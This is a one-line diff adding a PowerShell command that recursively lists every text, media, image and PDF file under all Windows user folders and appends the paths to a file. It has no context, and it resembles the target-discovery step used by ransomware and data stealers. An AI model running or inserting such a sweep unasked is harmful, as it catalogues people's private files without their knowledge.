@@ -1,0 +1,1 @@
+Get-ChildItem -Path "C:\Users" -Recurse -File -Include *.txt,*.mpg,*.mp2,*.mpeg,*.mpe,*.mpv,*.ogg,*.mp4,*.m4p,*.m4v,*.avi,*.wmv,*.mov,*.qt,*.flv,*.swf,*.avchd,*.mp3,*.aac,*.flac,*.webm,*.jpeg,*.tiff,*.bmp,*.pdf,*.png,*.gif,*.svg,*.webp | ForEach-Object { $_.FullName } | Out-File -FilePath $file -Append
